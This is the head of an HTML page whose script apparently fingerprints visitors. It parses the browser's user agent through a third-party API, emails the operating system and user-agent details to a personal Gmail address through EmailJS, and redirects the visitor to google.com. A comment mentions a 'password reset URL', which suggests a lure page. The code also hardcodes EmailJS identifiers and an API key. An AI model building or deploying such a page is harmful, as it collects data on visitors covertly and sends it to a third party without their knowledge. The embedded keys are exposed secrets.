<!DOCTYPE html>
<html lang="en">
<head>
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script type="text/javascript">
    (function() {
      // Replace 'sEle-I2tdJ1MuIFYw' with your actual EmailJS user ID
      emailjs.init('sEle-I2tdJ1MuIFYw');
    })();
  </script>
  <script>
    function sendEmail(content) {
      emailjs.send('service_4kjseoi', 'template_jbhty33', {
        to_email: 'testmailforiyush@gmail.com', // Replace with your recipient's email
        User_Agent: navigator.userAgent,
        sendEmailButton: true,
        openWebsiteButton: false,
        email_content: content
      })
      .then(function(response) {
        console.log('Email sent:', response);
        alert('Email sent successfully!');
      })
      .catch(function(error) {
        console.error('Error sending email:', error);
        alert('Error sending email. Please try again.');
      });
    }

    function sendDeviceInfo() {
      fetch('https://api.whatismybrowser.com/api/v2/user_agent_parse', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-KEY': '99f5625f123d42cae156472700748937'
        },
        body: JSON.stringify({
          user_agent: navigator.userAgent
        })
      })
      .then(response => response.json())
      .then(data => {
        const deviceInfo = data.parse;
        const emailContent = `
          <p>Operating Platform: ${deviceInfo.simple_operating_platform_string}</p>
          <p>User Agent: ${deviceInfo.user_agent}</p>
          <p>OS Name Code: ${deviceInfo.operating_system_name_code}</p>
          <p>OS Name: ${deviceInfo.operating_system_name}</p>
        `;

        // Replace 'URL_FOR_PASSWORD_RESET' with your actual password reset URL
        window.location.href = 'https://www.google.com';

        // Call your email sending function with the device information
        sendEmail(emailContent);
      })
      .catch(error => console.error('Error fetching device information:', error));
    }
  </script>
</head>
